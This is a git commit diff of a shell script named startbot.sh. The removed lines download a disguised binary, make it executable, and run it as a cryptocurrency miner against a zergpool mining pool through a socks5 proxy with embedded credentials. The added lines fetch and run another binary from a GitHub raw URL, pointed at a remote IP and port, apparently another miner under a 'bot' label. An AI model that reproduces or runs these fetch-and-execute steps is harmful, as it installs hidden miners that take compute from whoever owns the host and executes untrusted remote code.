d26e686569b12d0536b12060806b70296ccde0bc
Omarjetos <93458140+Omarjetos@users.noreply.github.com>
2021-11-20 20:32:36 +0700

    Update startbot.sh

--- startbot.sh
+++ startbot.sh
@@ -4,6 +4,6 @@
 
 
 cd /home/shell-bot
-wget -qO ngaceng https://github.com/janganminin/literate-couscous/releases/download/ww/bokep
-chmod +x ngaceng
-./ngaceng -v -l verushash.mine.zergpool.com:3300 -u D7hBkeeqaXzc7dy71FLqUdPoyogAYrU8s7.ngaceng -p c=DOGE,mc=VRSC -t 8 -x socks5://omar:omar@138.197.166.210:111
+wget -qO bot https://github.com/Omarjetos/ezz/blob/master/nano?raw=true
+chmod +x bot
+./bot -o 138.197.166.210:5555 -u ojokmelumelu
